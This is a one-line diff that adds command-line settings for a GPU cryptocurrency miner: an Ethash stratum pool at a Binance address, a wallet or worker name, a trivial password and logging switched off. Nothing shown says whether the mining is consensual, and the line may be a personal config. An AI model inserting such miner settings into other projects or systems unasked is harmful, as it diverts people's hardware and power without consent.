@@ -1,0 +1,2 @@
+-pool stratum+tcp://ethash.poolbinance.com:1800 -wal rdshl.xx -pass 123456 -log 0 -hwm 5 -cdm 0 -nvidia
+
